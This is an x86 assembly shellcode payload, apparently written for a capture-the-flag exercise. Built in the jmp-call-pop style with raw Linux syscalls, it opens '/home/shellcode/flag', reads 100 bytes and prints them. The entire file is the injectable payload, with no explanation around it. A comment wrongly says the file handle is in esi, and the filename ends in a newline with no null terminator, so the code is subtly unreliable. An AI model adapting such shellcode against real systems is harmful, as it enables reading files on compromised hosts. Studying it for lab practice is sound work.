[SECTION .text]

global _start

_start:
	jmp short ender
starter:
;;open
	pop		ebx
	mov		edi, ebx
	xor		eax, eax
    mov     al, 5
	;mov		ebx, 0x0804a09e
	;mov		ecx, 0
	xor		ecx, ecx
    int     0x80
	mov		ebx, eax
;;file handle in esi
;;read
	xor		eax, eax
	mov		al, 3
	mov		ecx, edi
	xor		edx, edx
	mov		dl, 100
	int		0x80
;;write
	mov		al, 4
	xor		ebx, ebx
	mov		bl, 1
	mov		ecx, edi
	xor		edx, edx
	mov		dl, 100
	int		0x80
;;exit
	mov		al, 1
	xor		ebx, ebx
	int		0x80
ender:
	call	starter
filename:
	db	`/home/shellcode/flag\n`
